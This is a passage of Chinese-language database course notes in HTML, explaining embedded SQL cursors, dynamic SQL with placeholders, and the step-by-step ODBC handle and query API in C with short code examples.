</span><span id="__span-148-4"><a id="__codelineno-148-4" name="__codelineno-148-4" href="#note-db-sql-__codelineno-148-4"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">END</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span></code></pre></div>
<p>使用<code>scanf</code>函数读取用户输入的账号和存款额。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#note-db-sql-__codelineno-149-1"></a><span class="c1">// 读取账号和存款额</span>
</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2" href="#note-db-sql-__codelineno-149-2"></a><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter account number and amount to deposit: &quot;</span><span class="p">);</span>
</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3" href="#note-db-sql-__codelineno-149-3"></a><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s %f&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">an</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">bal</span><span class="p">);</span>
</span></code></pre></div>
<p>使用<code>EXEC SQL UPDATE</code>语句更新数据库中的账户余额。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#note-db-sql-__codelineno-150-1"></a><span class="c1">// 更新账户余额</span>
</span><span id="__span-150-2"><a id="__codelineno-150-2" name="__codelineno-150-2" href="#note-db-sql-__codelineno-150-2"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">UPDATE</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">:</span><span class="n">bal</span>
</span><span id="__span-150-3"><a id="__codelineno-150-3" name="__codelineno-150-3" href="#note-db-sql-__codelineno-150-3"></a><span class="n">WHERE</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">:</span><span class="n">an</span><span class="p">;</span>
</span></code></pre></div>
<ul>
<li>多行修改</li>
</ul>
<p>在嵌入式SQL中，可以通过声明游标为可更新（<code>FOR UPDATE</code>）来更新游标获取的元组。这允许在游标当前指向的记录上执行更新操作。以下是一个示例，展示如何在C语言中使用嵌入式SQL和游标来更新数据库中的数据。</p>
<p>假设我们有一个<code>account</code>表，我们希望更新<code>Perryridge</code>分行的所有账户余额，每个账户增加100。</p>
<p>首先，声明用于存储查询结果的变量，并声明一个可更新的游标。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1" href="#note-db-sql-__codelineno-151-1"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">BEGIN</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2" href="#note-db-sql-__codelineno-151-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">an</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span><span class="w">  </span><span class="c1">// account number</span>
</span><span id="__span-151-3"><a id="__codelineno-151-3" name="__codelineno-151-3" href="#note-db-sql-__codelineno-151-3"></a><span class="kt">float</span><span class="w"> </span><span class="n">bal</span><span class="p">;</span><span class="w">    </span><span class="c1">// balance</span>
</span><span id="__span-151-4"><a id="__codelineno-151-4" name="__codelineno-151-4" href="#note-db-sql-__codelineno-151-4"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">END</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">SECTION</span><span class="p">;</span>
</span><span id="__span-151-5"><a id="__codelineno-151-5" name="__codelineno-151-5" href="#note-db-sql-__codelineno-151-5"></a>
</span><span id="__span-151-6"><a id="__codelineno-151-6" name="__codelineno-151-6" href="#note-db-sql-__codelineno-151-6"></a><span class="c1">// 声明可更新游标</span>
</span><span id="__span-151-7"><a id="__codelineno-151-7" name="__codelineno-151-7" href="#note-db-sql-__codelineno-151-7"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">DECLARE</span><span class="w"> </span><span class="n">csr</span><span class="w"> </span><span class="n">CURSOR</span><span class="w"> </span><span class="n">FOR</span>
</span><span id="__span-151-8"><a id="__codelineno-151-8" name="__codelineno-151-8" href="#note-db-sql-__codelineno-151-8"></a><span class="n">SELECT</span><span class="w"> </span><span class="o">*</span>
</span><span id="__span-151-9"><a id="__codelineno-151-9" name="__codelineno-151-9" href="#note-db-sql-__codelineno-151-9"></a><span class="n">FROM</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-151-10"><a id="__codelineno-151-10" name="__codelineno-151-10" href="#note-db-sql-__codelineno-151-10"></a><span class="n">WHERE</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Perryridge</span><span class="err">&#39;</span>
</span><span id="__span-151-11"><a id="__codelineno-151-11" name="__codelineno-151-11" href="#note-db-sql-__codelineno-151-11"></a><span class="n">FOR</span><span class="w"> </span><span class="n">UPDATE</span><span class="w"> </span><span class="n">OF</span><span class="w"> </span><span class="n">balance</span><span class="p">;</span>
</span></code></pre></div>
<p>使用<code>OPEN</code>语句执行查询并打开游标。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1" href="#note-db-sql-__codelineno-152-1"></a><span class="c1">// 打开游标</span>
</span><span id="__span-152-2"><a id="__codelineno-152-2" name="__codelineno-152-2" href="#note-db-sql-__codelineno-152-2"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">OPEN</span><span class="w"> </span><span class="n">csr</span><span class="p">;</span>
</span></code></pre></div>
<p>使用<code>FETCH</code>语句逐行获取查询结果，并在游标当前指向的记录上执行更新操作。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1" href="#note-db-sql-__codelineno-153-1"></a><span class="c1">// 获取和更新数据</span>
</span><span id="__span-153-2"><a id="__codelineno-153-2" name="__codelineno-153-2" href="#note-db-sql-__codelineno-153-2"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-153-3"><a id="__codelineno-153-3" name="__codelineno-153-3" href="#note-db-sql-__codelineno-153-3"></a><span class="w">    </span><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">FETCH</span><span class="w"> </span><span class="n">csr</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="o">:</span><span class="n">an</span><span class="p">,</span><span class="w"> </span><span class="o">:</span><span class="n">bal</span><span class="p">;</span>
</span><span id="__span-153-4"><a id="__codelineno-153-4" name="__codelineno-153-4" href="#note-db-sql-__codelineno-153-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sqlca</span><span class="p">.</span><span class="n">sqlcode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// 检查是否成功获取数据</span>
</span><span id="__span-153-5"><a id="__codelineno-153-5" name="__codelineno-153-5" href="#note-db-sql-__codelineno-153-5"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-153-6"><a id="__codelineno-153-6" name="__codelineno-153-6" href="#note-db-sql-__codelineno-153-6"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-153-7"><a id="__codelineno-153-7" name="__codelineno-153-7" href="#note-db-sql-__codelineno-153-7"></a><span class="w">    </span><span class="c1">// 处理数据（例如打印）</span>
</span><span id="__span-153-8"><a id="__codelineno-153-8" name="__codelineno-153-8" href="#note-db-sql-__codelineno-153-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Account Number: %s, Balance: %.2f</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">an</span><span class="p">,</span><span class="w"> </span><span class="n">bal</span><span class="p">);</span>
</span><span id="__span-153-9"><a id="__codelineno-153-9" name="__codelineno-153-9" href="#note-db-sql-__codelineno-153-9"></a>
</span><span id="__span-153-10"><a id="__codelineno-153-10" name="__codelineno-153-10" href="#note-db-sql-__codelineno-153-10"></a><span class="w">    </span><span class="c1">// 更新当前游标位置的记录</span>
</span><span id="__span-153-11"><a id="__codelineno-153-11" name="__codelineno-153-11" href="#note-db-sql-__codelineno-153-11"></a><span class="w">    </span><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">UPDATE</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-153-12"><a id="__codelineno-153-12" name="__codelineno-153-12" href="#note-db-sql-__codelineno-153-12"></a><span class="w">    </span><span class="n">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">100</span>
</span><span id="__span-153-13"><a id="__codelineno-153-13" name="__codelineno-153-13" href="#note-db-sql-__codelineno-153-13"></a><span class="w">    </span><span class="n">WHERE</span><span class="w"> </span><span class="n">CURRENT</span><span class="w"> </span><span class="n">OF</span><span class="w"> </span><span class="n">csr</span><span class="p">;</span>
</span><span id="__span-153-14"><a id="__codelineno-153-14" name="__codelineno-153-14" href="#note-db-sql-__codelineno-153-14"></a><span class="p">}</span>
</span></code></pre></div>
<p>使用<code>CLOSE</code>语句关闭游标并释放资源。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1" href="#note-db-sql-__codelineno-154-1"></a><span class="c1">// 关闭游标</span>
</span><span id="__span-154-2"><a id="__codelineno-154-2" name="__codelineno-154-2" href="#note-db-sql-__codelineno-154-2"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">CLOSE</span><span class="w"> </span><span class="n">csr</span><span class="p">;</span>
</span></code></pre></div>
<h3 id="note-db-sql-dynamic-sql">Dynamic SQL<a class="headerlink" href="#note-db-sql-dynamic-sql" title="Permanent link">&para;</a></h3>
<p>动态SQL（Dynamic SQL）允许程序在运行时构建和提交SQL查询。这种技术非常有用，因为它提供了灵活性，使程序能够根据用户输入或其他运行时条件生成SQL语句。</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1" href="#note-db-sql-__codelineno-155-1"></a><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">sqlprog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;update account set balance = balance * 1.05 where account_number = ?&quot;</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2" href="#note-db-sql-__codelineno-155-2"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">PREPARE</span><span class="w"> </span><span class="n">dynprog</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="o">:</span><span class="n">sqlprog</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-155-3"><a id="__codelineno-155-3" name="__codelineno-155-3" href="#note-db-sql-__codelineno-155-3"></a><span class="kt">char</span><span class="w"> </span><span class="n">v_account</span><span class="w"> </span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;A_101&quot;</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-155-4"><a id="__codelineno-155-4" name="__codelineno-155-4" href="#note-db-sql-__codelineno-155-4"></a><span class="err">……</span>
</span><span id="__span-155-5"><a id="__codelineno-155-5" name="__codelineno-155-5" href="#note-db-sql-__codelineno-155-5"></a><span class="n">EXEC</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">EXECUTE</span><span class="w"> </span><span class="n">dynprog</span><span class="w"> </span><span class="n">USING</span><span class="w"> </span><span class="o">:</span><span class="n">v_account</span><span class="p">;</span>
</span></code></pre></div>
<ul>
<li><code>char *sqlprog</code>定义了一个包含占位符?的SQL语句。占位符用于在执行时插入实际的值。</li>
<li><code>EXEC SQL PREPARE dynprog FROM :sqlprog;</code>准备动态SQL程序dynprog，将SQL语句从字符串变量sqlprog中读取。</li>
<li><code>char v_account[10] = "A_101";</code>定义了一个变量v_account，用于存储要更新的账户号码。</li>
<li><code>EXEC SQL EXECUTE dynprog USING :v_account;</code>执行准备好的SQL程序dynprog，并通过USING子句将v_account的值插入到SQL语句中的占位符位置。</li>
</ul>
<h2 id="note-db-sql-odbc-and-jdbc">ODBC and JDBC<a class="headerlink" href="#note-db-sql-odbc-and-jdbc" title="Permanent link">&para;</a></h2>
<p>开放数据库互连（ODBC，Open DataBase Connectivity）<br />
一种用于应用程序与数据库服务器通信的标准。<br />
通过应用程序接口（API）来：  </p>
<ul>
<li>打开与数据库的连接，</li>
<li>发送查询和更新，</li>
<li>获取结果。</li>
</ul>
<p>GUI、电子表格等应用程序可以使用 ODBC。</p>
<p>嵌入式 SQL 与 ODBC 的比较：  </p>
<ul>
<li>嵌入式 SQL：预编译器是特定于 DBMS 的。</li>
<li>ODBC 提供了一种通过 API 将数据库连接到应用程序程序员的标准化方式。</li>
<li>不特定于 DBMS。</li>
<li>不需要预编译。</li>
</ul>
<p>ODBC提供了一个公共的、与具体数据库无关的应用程序设计接口API 。它为开发者提供单一的编程接口，这样同一个应用程序就可以访问不同的数据库服务器。 </p>
<p>使用ODBC访问数据库的方法：</p>
<ul>
<li>ODBC API访问数据库 </li>
<li>Visual C++的MFC提供了丰富的ODBC类，它们封装了大量的函数用以完成数据库的大部分应用 </li>
</ul>
<p>访问数据库的其他方法: </p>
<ul>
<li>OLE DB (Object Link and Embedding DataBase) --- 是一套通过COM (Component Object Model,组件对象模型)接口访问数据库的ActiveX的底层接口技术,速度快，支持关系型和非关系型数据库，编程量大。 </li>
<li>ADO---基于COM，建立在OLE DB 之上，更易于使用. </li>
<li>DAO (Data Access Objects) </li>
</ul>
<figure>
    <img src="../NOTE/DB/img/sql-3.png" alt="ODBC Architecture">
    <figcaption>ODBC Architecture</figcaption>
</figure>

<p><strong>句柄</strong>（Handle）是一种抽象的引用，用于标识和管理系统资源。句柄通常是一个整数或指针，程序通过它来访问和操作特定的资源，而不需要直接与资源的底层实现交互。</p>
<pre class="mermaid"><code>graph TD
    A[应用程序] --&gt; B[环境句柄]
    B --&gt; C[连接句柄]
    B --&gt; D[连接句柄]
    B --&gt; E[连接句柄]
    D --&gt; F[语句句柄]
    D --&gt; G[语句句柄]
    D --&gt; H[语句句柄]</code></pre>
<ol>
<li>
<p>分配环境句柄
<div class="language-c highlight"><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1" href="#note-db-sql-__codelineno-156-1"></a><span class="n">HENV</span><span class="w"> </span><span class="n">henv</span><span class="p">;</span>
</span><span id="__span-156-2"><a id="__codelineno-156-2" name="__codelineno-156-2" href="#note-db-sql-__codelineno-156-2"></a><span class="n">SQLAllocEnv</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">&amp;</span><span class="n">henv</span><span class="w"> </span><span class="p">);</span>
</span></code></pre></div></p>
</li>
<li>
<p>分配连接句柄
<div class="language-c highlight"><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1" href="#note-db-sql-__codelineno-157-1"></a><span class="n">HDBC</span><span class="w"> </span><span class="n">hdbc</span><span class="p">;</span>
</span><span id="__span-157-2"><a id="__codelineno-157-2" name="__codelineno-157-2" href="#note-db-sql-__codelineno-157-2"></a><span class="n">SQLAllocConnect</span><span class="p">(</span><span class="n">henv</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hdbc</span><span class="p">);</span>
</span></code></pre></div></p>
</li>
</ol>
<p>3.用已分配的连接句柄连接数据源
<div class="language-c highlight"><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1" href="#note-db-sql-__codelineno-158-1"></a><span class="n">SQLConnect</span><span class="w"> </span><span class="p">(</span><span class="n">hdbc</span><span class="p">,</span><span class="w"> </span><span class="n">szDSN</span><span class="p">,</span><span class="w"> </span><span class="n">cbDSN</span><span class="p">,</span><span class="w"> </span><span class="n">szUID</span><span class="p">,</span><span class="w"> </span><span class="n">cbUID</span><span class="p">,</span><span class="w"> </span><span class="n">szAuthStr</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-158-2"><a id="__codelineno-158-2" name="__codelineno-158-2" href="#note-db-sql-__codelineno-158-2"></a><span class="n">cbAuthStr</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>
</span></code></pre></div>
说明：<code>hdbc</code>是一个已分配的连接句柄；
<code>szDSN</code>和<code>cbDSN</code>分别表示系统所要连接的数据源名称字符串及其长度；
<code>szUID</code>和<code>cbUID</code>分别表示连接数据源的用户名字符串及其长度 
<code>szAuthStr</code>和<code>cbAuthStr</code>分别表示连接数据源的权限字符串及其长
度。</p>
<ol>
<li>
<p>分配语句句柄
<div class="language-c highlight"><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1" href="#note-db-sql-__codelineno-159-1"></a><span class="n">HSTMT</span><span class="w"> </span><span class="n">hstmt</span><span class="p">;</span>
</span><span id="__span-159-2"><a id="__codelineno-159-2" name="__codelineno-159-2" href="#note-db-sql-__codelineno-159-2"></a><span class="n">SQLAllocStmt</span><span class="w"> </span><span class="p">(</span><span class="n">hdbc</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hstmt</span><span class="p">);</span><span class="w"> </span>
</span></code></pre></div></p>
</li>
<li>
<p>1直接执行SQL语句
<div class="language-c highlight"><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1" href="#note-db-sql-__codelineno-160-1"></a><span class="n">SQLExecDirect</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">hstmt</span><span class="p">,</span><span class="w"> </span><span class="n">szSqlStr</span><span class="p">,</span><span class="w"> </span><span class="n">cbSqlStr</span><span class="w"> </span><span class="p">);</span>
</span></code></pre></div>
说明：<code>hstmt</code>是一个有效的语句句柄；
<code>szSqlStr</code>和<code>cbSqlStr</code>分别表示将要执行的SQL语句的字符串及其长度。
例子：<code>retcode=SQLExecDirect(hstmt, "delete from book where ISBN=1", SQL_NTS);</code>
说明：删除book表中ISBN=1的记录。SQL_NTS是ODBC的一个常数，当字符串是以NULL结束时，可用它来表示字符串的长度。</p>
</li>
</ol>
<p>5.2有准备地执行SQL语句
如果SQL语句需要执行几次，则采用有准备的执行更好，避免了SQL语句的多次分析。有准备的执行需要两个函数。
<div class="language-c highlight"><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1" href="#note-db-sql-__codelineno-161-1"></a><span class="n">SQLPrepare</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">hstmt</span><span class="p">,</span><span class="w"> </span><span class="n">szSqlStr</span><span class="p">,</span><span class="w"> </span><span class="n">cbSqlStr</span><span class="p">);</span>
</span></code></pre></div>
说明：SQL语句准备函数，参数同SQLExecDirect。
<div class="language-c highlight"><pre><span></span><code><span id="__span-162-1"><a id="__codelineno-162-1" name="__codelineno-162-1" href="#note-db-sql-__codelineno-162-1"></a><span class="n">SQLExecute</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">hstmt</span><span class="w"> </span><span class="p">);</span>
</span></code></pre></div>
说明：SQL语句执行函数</p>
<ol>
<li>查询结果的获取
<div class="language-c highlight"><pre><span></span><code><span id="__span-163-1"><a id="__codelineno-163-1" name="__codelineno-163-1" href="#note-db-sql-__codelineno-163-1"></a><span class="n">SQLFetch</span><span class="p">(</span><span class="n">hstmt</span><span class="p">);</span>
</span></code></pre></div>
说明：把游标移到下一行，当查询语句执行后第一次调用时移到结果集的第一行。
<div class="language-c highlight"><pre><span></span><code><span id="__span-164-1"><a id="__codelineno-164-1" name="__codelineno-164-1" href="#note-db-sql-__codelineno-164-1"></a><span class="n">SQLGetData</span><span class="p">(</span><span class="n">hstmt</span><span class="p">,</span><span class="w"> </span><span class="n">icol</span><span class="p">,</span><span class="w"> </span><span class="n">fCType</span><span class="p">,</span><span class="w"> </span><span class="n">rgbValue</span><span class="p">,</span><span class="w"> </span><span class="n">cbValueMax</span><span class="p">,</span><span class="w"> </span><span class="n">pcbValue</span><span class="p">);</span>
</span></code></pre></div>
说明：读取游标指向行的列值。
icol和fCType分别表示结果集的列号和类型；
rgbValue和cbValueMax是接收数据存储区的指针和最大长度；
pcbValue是返回参数，表示本次调用后实际接收到的数据的字节数。</li>
</ol>
<p>7.释放语句句柄
<div class="language-c highlight"><pre><span></span><code><span id="__span-165-1"><a id="__codelineno-165-1" name="__codelineno-165-1" href="#note-db-sql-__codelineno-165-1"></a><span class="n">SQLfreeStmt</span><span class="p">(</span><span class="n">hstmt</span><span class="p">,</span><span class="w"> </span><span class="n">foption</span><span class="p">);</span>
</span></code></pre></div>
说明：<code>foption</code>指定选项，一个选项是用<code>SQL_DROP</code>表示释放所有与该句 
柄相关的资源。</p>
<p>8.断开数据源连接
<div class="language-c highlight"><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1" href="#note-db-sql-__codelineno-166-1"></a><span class="n">SQLDisconnect</span><span class="p">(</span><span class="n">hdbc</span><span class="p">);</span>
</span></code></pre></div>
9.释放连接句柄
<div class="language-c highlight"><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1" href="#note-db-sql-__codelineno-167-1"></a><span class="n">SQLFreeConnect</span><span class="p">(</span><span class="n">hdbc</span><span class="p">);</span><span class="w">   </span>
</span></code></pre></div></p>
<p>10.释放环境句柄
<div class="language-c highlight"><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1" href="#note-db-sql-__codelineno-168-1"></a><span class="n">SQLFreeEnv</span><span class="p">(</span><span class="n">henv</span><span class="p">);</span><span class="w"> </span>
</span></code></pre></div></p>
<figure>
    <img src="../NOTE/DB/img/sql-4.png" alt="ODBC Architecture">
    <figcaption>ODBC 编程流程</figcaption>
</figure>

<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1" href="#note-db-sql-__codelineno-169-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">ODBCexample</span><span class="p">()</span><span class="w">   </span><span class="c1">// 程序结构 </span>
</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2" href="#note-db-sql-__codelineno-169-2"></a><span class="p">{</span><span class="w"> </span>
</span><span id="__span-169-3"><a id="__codelineno-169-3" name="__codelineno-169-3" href="#note-db-sql-__codelineno-169-3"></a><span class="w">   </span><span class="n">RETCODE</span><span class="w"> </span><span class="n">error</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-169-4"><a id="__codelineno-169-4" name="__codelineno-169-4" href="#note-db-sql-__codelineno-169-4"></a><span class="w">   </span><span class="n">HENV</span><span class="w"> </span><span class="n">env</span><span class="p">;</span><span class="w">   </span><span class="cm">/* environment */</span><span class="w"> </span>
</span><span id="__span-169-5"><a id="__codelineno-169-5" name="__codelineno-169-5" href="#note-db-sql-__codelineno-169-5"></a><span class="w">   </span><span class="n">HDBC</span><span class="w"> </span><span class="n">conn</span><span class="p">;</span><span class="w">   </span><span class="cm">/* database connection */</span><span class="w"> </span>
</span><span id="__span-169-6"><a id="__codelineno-169-6" name="__codelineno-169-6" href="#note-db-sql-__codelineno-169-6"></a><span class="w">   </span><span class="n">SQLAllocEnv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">env</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-169-7"><a id="__codelineno-169-7" name="__codelineno-169-7" href="#note-db-sql-__codelineno-169-7"></a><span class="w">   </span><span class="n">SQLAllocConnect</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">conn</span><span class="p">);</span><span class="w">   </span><span class="cm">/* 建立连接句柄 */</span><span class="w"> </span>
</span><span id="__span-169-8"><a id="__codelineno-169-8" name="__codelineno-169-8" href="#note-db-sql-__codelineno-169-8"></a><span class="w">   </span><span class="n">SQLConnect</span><span class="w"> </span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;MySQLServer&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_NTS</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_NTS</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;password&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_NTS</span><span class="p">);</span><span class="w">  </span><span class="cm">/* 建立用户user与数据源的连接，SQL_NTS表示前一参量以null结尾 */</span><span class="w"> </span>
</span><span id="__span-169-9"><a id="__codelineno-169-9" name="__codelineno-169-9" href="#note-db-sql-__codelineno-169-9"></a>
</span><span id="__span-169-10"><a id="__codelineno-169-10" name="__codelineno-169-10" href="#note-db-sql-__codelineno-169-10"></a><span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="n">branchname</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-169-11"><a id="__codelineno-169-11" name="__codelineno-169-11" href="#note-db-sql-__codelineno-169-11"></a><span class="w">   </span><span class="kt">float</span><span class="w"> </span><span class="n">balance</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-169-12"><a id="__codelineno-169-12" name="__codelineno-169-12" href="#note-db-sql-__codelineno-169-12"></a><span class="w">   </span><span class="kt">int</span><span class="w"> </span><span class="n">lenOut1</span><span class="p">,</span><span class="w"> </span><span class="n">lenOut2</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-169-13"><a id="__codelineno-169-13" name="__codelineno-169-13" href="#note-db-sql-__codelineno-169-13"></a><span class="w">   </span><span class="n">HSTMT</span><span class="w"> </span><span class="n">stmt</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-169-14"><a id="__codelineno-169-14" name="__codelineno-169-14" href="#note-db-sql-__codelineno-169-14"></a>
</span><span id="__span-169-15"><a id="__codelineno-169-15" name="__codelineno-169-15" href="#note-db-sql-__codelineno-169-15"></a><span class="w">   </span><span class="n">SQLAllocStmt</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">stmt</span><span class="p">);</span><span class="w">   </span><span class="cm">/* 为该连接建立数据区，将来存放查询结果 */</span><span class="w"> </span>
</span><span id="__span-169-16"><a id="__codelineno-169-16" name="__codelineno-169-16" href="#note-db-sql-__codelineno-169-16"></a><span class="w">   </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">sqlquery</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;select branch_name, sum(balance) from account group by branch_name&quot;</span><span class="p">;</span><span class="w">   </span><span class="cm">/* 装配SQL语句 */</span><span class="w"> </span>
</span><span id="__span-169-17"><a id="__codelineno-169-17" name="__codelineno-169-17" href="#note-db-sql-__codelineno-169-17"></a><span class="w">   </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SQLExecDirect</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span><span class="w"> </span><span class="n">sqlquery</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_NTS</span><span class="p">);</span><span class="w"> </span><span class="cm">/* 执行sql语句,查询结果存放到数据区stmt，同时sql语句执行状态的返回值送变量error */</span><span class="w"> </span>
</span><span id="__span-169-18"><a id="__codelineno-169-18" name="__codelineno-169-18" href="#note-db-sql-__codelineno-169-18"></a>
</span><span id="__span-169-19"><a id="__codelineno-169-19" name="__codelineno-169-19" href="#note-db-sql-__codelineno-169-19"></a><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">error</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SQL_SUCCESS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-169-20"><a id="__codelineno-169-20" name="__codelineno-169-20" href="#note-db-sql-__codelineno-169-20"></a><span class="w">       </span><span class="n">SQLBindCol</span><span class="p">(</span><span class="n">stmt</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">SQL_C_CHAR</span><span class="p">,</span><span class="w"> </span><span class="n">branchname</span><span class="p">,</span><span class="w"> </span><span class="mi">80</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">lenOut1</span><span class="p">);</span><span class="w"> </span>
